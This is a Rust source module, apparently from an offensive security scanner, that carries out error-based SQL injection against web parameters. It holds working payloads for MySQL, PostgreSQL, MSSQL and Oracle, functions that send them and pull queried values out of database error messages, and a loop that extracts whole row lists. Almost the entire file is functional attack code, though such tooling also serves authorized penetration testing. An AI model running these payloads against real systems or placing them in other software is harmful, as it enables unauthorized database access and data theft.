//! Error-based SQL Injection Data Extraction
//!
//! Uses database error messages to extract data (works on verbose error configs)

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::sqli::DatabaseType;
use regex::Regex;
use reqwest::Method;
use url::Url;

/// Extract data using error-based technique
pub async fn error_extract_value(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
) -> anyhow::Result<Option<String>> {
    let payload = match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => {
            // EXTRACTVALUE technique
            format!(
                "' AND EXTRACTVALUE(1,CONCAT(0x7e,({}),0x7e))-- ",
                query
            )
        }
        DatabaseType::PostgreSQL => {
            // CAST error technique
            format!(
                "' AND 1=CAST((SELECT ({})) AS INT)-- ",
                query
            )
        }
        DatabaseType::MSSQL => {
            // CONVERT error technique
            format!(
                "' AND 1=CONVERT(INT,({}))-- ",
                query
            )
        }
        DatabaseType::Oracle => {
            // XMLType error technique
            format!(
                "' AND 1=XMLType((SELECT concat(chr(126),({}),chr(126)) FROM dual))-- ",
                query
            )
        }
        DatabaseType::SQLite => {
            // No direct error extraction, fall back to other methods
            return Ok(None);
        }
    };
    
    let mut test_url = url.clone();
    test_url.query_pairs_mut().append_pair(param, &payload);
    
    let req = HttpRequest::new(Method::GET, test_url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();
    
    // Extract value from error message
    extract_from_error(&body, db_type)
}

/// Extract value from database error message
fn extract_from_error(body: &str, db_type: DatabaseType) -> anyhow::Result<Option<String>> {
    match db_type {
        DatabaseType::MySQL | DatabaseType::Unknown => {
            // EXTRACTVALUE returns: XPATH syntax error: '~value~'
            if let Ok(re) = Regex::new(r"XPATH syntax error: '~([^~]*)~'") {
                if let Some(caps) = re.captures(body) {
                    return Ok(caps.get(1).map(|m| m.as_str().to_string()));
                }
            }
            // Alternative: look for quoted strings in error
            if let Ok(re) = Regex::new(r"'([^']{1,500})'") {
                for cap in re.captures_iter(body) {
                    let val = cap.get(1).map(|m| m.as_str());
                    if let Some(v) = val {
                        if !v.contains("SELECT") && !v.contains("AND") && v.len() > 2 {
                            return Ok(Some(v.to_string()));
                        }
                    }
                }
            }
        }
        DatabaseType::PostgreSQL => {
            // CAST error: invalid input syntax for integer: "value"
            if let Ok(re) = Regex::new(r#"invalid input syntax for (?:type )?integer: "([^"]*)""#) {
                if let Some(caps) = re.captures(body) {
                    return Ok(caps.get(1).map(|m| m.as_str().to_string()));
                }
            }
        }
        DatabaseType::MSSQL => {
            // Conversion failed: when converting the varchar value 'value' to data type int
            if let Ok(re) = Regex::new(r"converting the (?:n)?varchar value '([^']*)' to") {
                if let Some(caps) = re.captures(body) {
                    return Ok(caps.get(1).map(|m| m.as_str().to_string()));
                }
            }
        }
        DatabaseType::Oracle => {
            // ORA-XXXXX: "value"
            if let Ok(re) = Regex::new(r#"ORA-\d+:.*?["']([^"']+)["']"#) {
                if let Some(caps) = re.captures(body) {
                    return Ok(caps.get(1).map(|m| m.as_str().to_string()));
                }
            }
        }
        DatabaseType::SQLite => {
            // SQLite doesn't support error-based extraction well
        }
    }
    
    Ok(None)
}

/// MySQL-specific UPDATEXML technique
pub async fn mysql_updatexml_extract(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
) -> anyhow::Result<Option<String>> {
    let payload = format!(
        "' AND UPDATEXML(1,CONCAT(0x7e,({}),0x7e),1)-- ",
        query
    );
    
    let mut test_url = url.clone();
    test_url.query_pairs_mut().append_pair(param, &payload);
    
    let req = HttpRequest::new(Method::GET, test_url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();
    
    // Look for value between tildes
    if let Ok(re) = Regex::new(r"~([^~]{1,1000})~") {
        if let Some(caps) = re.captures(&body) {
            return Ok(caps.get(1).map(|m| m.as_str().to_string()));
        }
    }
    
    Ok(None)
}

/// MySQL-specific EXP overflow technique (for older versions)
pub async fn mysql_exp_extract(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
) -> anyhow::Result<Option<String>> {
    let payload = format!(
        "' AND EXP(~(SELECT * FROM (SELECT ({}))x))-- ",
        query
    );
    
    let mut test_url = url.clone();
    test_url.query_pairs_mut().append_pair(param, &payload);
    
    let req = HttpRequest::new(Method::GET, test_url);
    let resp = client.execute(req).await?;
    let body = resp.body_text();
    
    // Look for value in error message
    if let Ok(re) = Regex::new(r"DOUBLE value is out of range in '([^']*)'") {
        if let Some(caps) = re.captures(&body) {
            return Ok(caps.get(1).map(|m| m.as_str().to_string()));
        }
    }
    
    Ok(None)
}

/// Extract list using error-based technique
pub async fn error_extract_list(
    client: &HttpClient,
    url: &Url,
    param: &str,
    query: &str,
    db_type: DatabaseType,
    max_items: usize,
) -> anyhow::Result<Vec<String>> {
    let mut results = Vec::new();
    
    for i in 0..max_items {
        // Modify query to get row i
        let row_query = format!("{} LIMIT {},1", query, i);
        
        let value = error_extract_value(client, url, param, &row_query, db_type).await?;
        
        match value {
            Some(v) if !v.is_empty() => results.push(v),
            _ => break,
        }
    }
    
    Ok(results)
}

